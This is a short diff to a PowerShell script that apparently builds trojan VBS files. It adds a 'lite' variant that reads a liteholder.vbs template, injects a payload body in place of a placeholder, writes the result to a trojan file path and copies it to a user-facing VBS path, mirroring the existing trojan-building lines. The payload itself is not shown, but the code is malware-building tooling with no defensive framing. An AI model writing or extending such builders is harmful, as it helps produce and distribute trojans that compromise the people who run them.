@@ -119,3 +119,14 @@ $result = $result -replace '"__backName"', $name
 $result | Set-Content $server.troyanVbsFile
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
 Remove-Item $server.troyanVbsFile
+
+
+
+$liteholder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "liteholder.vbs")
+
+$result = $liteholder
+$result = $result -replace '0102', $body
+
+$result | Set-Content $server.troyanLiteVbsFile
+Copy-Item -Path $server.troyanLiteVbsFile -Destination $server.userLiteVbsFile -Force
+Remove-Item $server.troyanLiteVbsFile
